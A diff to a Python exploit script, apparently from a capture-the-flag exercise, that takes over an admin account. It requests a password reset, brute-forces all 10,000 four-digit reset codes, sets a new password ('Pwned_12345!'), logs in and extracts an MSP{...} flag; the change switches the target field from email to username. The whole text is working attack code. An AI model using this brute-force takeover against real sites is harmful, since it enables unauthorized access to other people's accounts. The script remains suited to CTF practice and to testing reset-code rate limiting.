@@ -6,7 +6,7 @@ import urllib.parse
 import http.cookiejar
 
 BASE_URL = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000").rstrip("/")
-TARGET_EMAIL = "admin@mushroom.cat"
+TARGET_USERNAME = "admin"
 NEW_PASSWORD = "Pwned_12345!"
 
 jar = http.cookiejar.CookieJar()
@@ -30,13 +30,13 @@ def get(path):
 def main():
     print(f"[*] Target: {BASE_URL}")
     print("[*] Requesting reset code...")
-    post("/reset/request", {"email": TARGET_EMAIL})
+    post("/reset/request", {"username": TARGET_USERNAME})
 
     found_code = None
     for i in range(10000):
         code = f"{i:04d}"
         body = post("/reset/confirm", {
-            "email": TARGET_EMAIL,
+            "username": TARGET_USERNAME,
             "code": code,
             "newPassword": NEW_PASSWORD
         })
@@ -52,7 +52,7 @@ def main():
         return 1
 
     print("[*] Logging in...")
-    post("/login", {"email": TARGET_EMAIL, "password": NEW_PASSWORD})
+    post("/login", {"username": TARGET_USERNAME, "password": NEW_PASSWORD})
     profile = get("/profile")
 
     m = re.search(r"MSP\{[^}]+\}", profile)
